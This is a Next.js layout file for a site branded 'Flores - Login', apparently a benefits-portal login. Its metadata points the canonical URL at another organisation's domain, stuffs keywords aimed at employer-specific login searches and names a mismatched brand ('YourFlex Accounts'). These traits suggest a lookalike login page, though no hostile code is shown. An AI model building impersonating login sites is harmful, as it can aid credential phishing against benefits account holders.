import type React from "react";
import type { Metadata } from "next";
import { Geist } from "next/font/google";
import { Analytics } from "@vercel/analytics/next";
import "./globals.css";

const geist = Geist({ subsets: ["latin"] });

const CANONICAL_LOGIN_URL =
  "https://flores247.wealthcareportal.com/Authentication/Handshake";
const SITE_DOMAIN = "flores247.wealthcareportal.com";
const SITE_BRAND = "Flores";

export const metadata: Metadata = {
  metadataBase: new URL(
    process.env.NEXT_PUBLIC_BASE_URL || CANONICAL_LOGIN_URL,
  ),
  title: {
    default: "Flores - Login",
    template: "%s | Flores",
  },
  keywords: [
    "Flores247",
    "floresHR",
    "floreshr login",
    "floreshr llc",
    "floreshr employer login",
    "floreshr customer service",
    "floreshr careers",
    "floreshr llc corp",
    "floreshr address",
    "floreshr reviews",
    "flores247.com portal",
    "flores247 app",
    "flores247 customer service",
    "flores247 cobra",
    "flores247 login page",
    "flores247 contact",
    "flores247.com web site",
    "flores247 emerge ortho",
    "floresHR emerge ortho",
    "flores247 emerge ortho login",
    "floresHR emerge ortho login",
    "flores247 florida cancer specialists & research institute",
    "floresHR florida cancer specialists & research institute",
    "flores247 florida cancer specialists & research institute login",
    "floresHR florida cancer specialists & research institute login",
    "flores247 florida cancer specialists",
    "floresHR florida cancer specialists",
    "flores247 florida cancer specialists login",
    "floresHR florida cancer specialists login",
    "flores247 navy federal credit union",
    "floresHR navy federal credit union",
    "flores247 navy federal credit union login",
    "floresHR navy federal credit union login",
    "flores247 micron",
    "floresHR micron",
    "flores247 micron login",
    "floresHR micron login",
    "Flores Associates",
    "benefits login",
    "FSA login",
    "HSA login",
    "HRA login",
    "flexible spending account",
    "health savings account",
    "health reimbursement arrangement",
    "benefits portal",
    "file claims",
    "benefits balance",
    "employee benefits",
    "participant login",
    "employer login",
    "how to file an FSA claim",
    "how to check HSA balance",
    "benefits account help",
    "FSA reimbursement process",
    "HSA eligible expenses",
    "COBRA payment portal",
    "benefits customer service",
    "benefits claims support",
    "forgot benefits password",
    "reset Flores247 password",
    "benefits account recovery",
    "upload receipt for reimbursement",
    "how to submit documentation",
    "Flores247 Navy Federal Credit Union login",
    "Flores247 Micron login",
    "Flores247 Florida Cancer Specialists login",
    "Flores247 EmergeOrtho login",
    "FloresHR Navy Federal Credit Union",
    "FloresHR Micron",
    "FloresHR Florida Cancer Specialists",
    "FloresHR EmergeOrtho",
  ],
  description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through Flores.`,

  authors: [{ name: "Flores" }],
  creator: "Flores",
  publisher: "Flores",
  applicationName: SITE_BRAND,
  referrer: "origin-when-cross-origin",
  robots: {
    index: true,
    follow: true,
    googleBot: {
      index: true,
      follow: true,
      "max-video-preview": -1,
      "max-image-preview": "large",
      "max-snippet": -1,
    },
  },
  openGraph: {
    type: "website",
    locale: "en_US",
    title: "Flores - Login",
    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through Flores.`,
    siteName: SITE_BRAND,
    url: CANONICAL_LOGIN_URL,
    images: [
      {
        url: "/favicon-32x32.png",
        width: 32,
        height: 32,
        alt: `${SITE_BRAND}`,
      },
    ],
  },
  twitter: {
    card: "summary",
    title: "Flores - Login",
    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through Flores.`,
    images: ["/favicon-32x32.png"],
  },
  icons: {
    icon: "/favicon-32x32.png",
    shortcut: "/favicon-32x32.png",
    apple: "/favicon-32x32.png",
  },
  viewport: {
    width: "device-width",
    initialScale: 1,
    maximumScale: 5,
  },
  themeColor: "#254650",
  category: "Business",
  alternates: {
    canonical: CANONICAL_LOGIN_URL,
    languages: {
      "en-US": CANONICAL_LOGIN_URL,
    },
  },
  other: {
    "geo.region": "US",
  },
};

const jsonLd = {
  "@context": "https://schema.org",
  "@type": "WebSite",
  name: SITE_BRAND,
  url: CANONICAL_LOGIN_URL,
  description:
    "YourFlex Accounts sign in portal. Login to manage your health and dependent care benefits, view account resources, and access your YourFlex Accounts profile.",
  publisher: {
    "@type": "Organization",
    name: "YourFlex Accounts",
  },
  inLanguage: "en-US",
  potentialAction: {
    "@type": "SearchAction",
    target: { "@type": "EntryPoint", url: CANONICAL_LOGIN_URL },
    "query-input": "required name=search_term_string",
  },
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="en-US">
      <head>
        <link
          href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap"
          rel="stylesheet"
        />
      </head>
      <body className={`${geist.className} font-sans antialiased`}>
        <script
          type="application/ld+json"
          dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }}
        />
        {children}
        <Analytics />
      </body>
    </html>
  );
}
